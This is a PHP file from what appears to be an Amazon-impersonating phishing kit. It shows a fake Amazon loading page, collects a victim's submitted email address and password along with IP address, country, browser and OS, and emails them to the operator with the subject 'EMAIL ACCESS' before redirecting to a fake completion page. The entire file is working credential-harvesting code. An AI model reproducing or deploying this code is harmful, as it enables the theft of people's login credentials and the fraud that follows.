<?php 
 require_once(dirname(dirname(dirname(__DIR__))).'/autoloader.php');
echo '<title>Amazon - Loading ... </title>';

echo '<center><br><br><br><br><img src="../../aws/img/gif/loading-4x._V1_.gif" style="margin-top:20%"></center>';


if(isset($_POST))
{
     $check = ['email','pass'];
    if($core->empty_post_array($check))
    {
        $core->redirect('../../ap/email?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
          exit;
    }

	$email = $core->post('email');
	$passw = $core->post('pass');
	$type = $core->post('type');

	$data = ['type' => $type,'email' => $email, 'password' => $passw , 'useragent' => $_SERVER['HTTP_USER_AGENT'] ,
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')];
    $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();

    $sendMsg = $core->parse_result('email',$data);
    $sendSubj = "EMAIL ACCESS : $email // $info";
    $sendFrom = "#HijaIyh:Amz";

    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
    $core->stats('email','email access : '.$email);


	$core->redirect('../../ap/finish?'.sha1(time()).'&locale='.@$_GET['locale']);
}